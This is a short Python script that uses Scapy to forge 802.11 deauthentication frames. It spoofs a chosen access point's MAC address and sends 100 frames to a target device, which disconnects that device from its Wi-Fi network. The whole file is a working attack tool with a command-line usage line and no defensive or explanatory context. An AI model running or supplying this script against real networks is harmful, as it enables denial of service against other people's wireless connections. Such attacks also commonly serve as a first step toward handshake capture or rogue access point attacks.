from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import sys

def deauth(target_mac, ap_mac, iface):
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth(reason=7)
    sendp(packet, iface=iface, count=100, inter=0.1)
    print(f"Sent deauth packets to {target_mac} from AP {ap_mac}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: sudo python deauth.py <Target_MAC> <AP_MAC> <Interface>")
        sys.exit(1)

    target_mac = sys.argv[1]
    ap_mac = sys.argv[2]
    iface = sys.argv[3]

    deauth(target_mac, ap_mac, iface)
